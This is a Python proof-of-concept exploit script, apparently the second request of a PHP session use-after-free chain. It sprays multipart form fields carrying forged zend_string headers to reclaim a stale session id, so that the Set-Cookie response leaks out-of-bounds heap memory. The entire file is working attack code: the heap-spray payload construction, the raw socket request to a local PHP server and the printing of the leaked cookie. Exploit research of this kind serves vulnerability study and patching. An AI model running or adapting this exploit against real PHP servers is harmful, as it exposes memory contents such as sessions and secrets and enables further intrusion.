#!/usr/bin/env python3
"""Request B for the stale-PS.id Set-Cookie leak.

No file part: pre-RINIT END cleanup -> php_session_initialize() uses the stale
PS(id) from request A and send_cookie=1 (left behind because A's reset_id could
not send a cookie after headers were sent). If B reclaims the stale id block
with a forged zend_string (huge len), the Set-Cookie value is a URL-encoded
out-of-bounds heap read.

usage: send_b_leak.py [pad_len] [pad_count]
prints response headers (truncated) and body.
"""
import socket, sys
PADLEN=int(sys.argv[1]) if len(sys.argv)>1 else 0
PADN=int(sys.argv[2]) if len(sys.argv)>2 else 0
LEAK_LEN=int(sys.argv[3],0) if len(sys.argv)>3 else 0x800
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
if PADN and PADLEN:
    val=bytearray(b'A'*PADLEN)
    if PADLEN>=0x20:
        # forged zend_string header viewed at content offset 0x10
        import struct
        struct.pack_into('<Q',val,0x10,LEAK_LEN)
        val[0x18]=ord('L')
    for i in range(PADN):
        parts.append({'n':('g%02d'%i),'d':bytes(val)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(h+body)
    while len(data)<400000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e:
    print("recv_err",repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
print("HEAD_LEN",len(head),"BODY",rest[:200])
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print("SETCOOKIE_LEN",len(line))
        print(line[:600].decode('latin1','replace'))
    else:
        print(line[:120].decode('latin1','replace'))
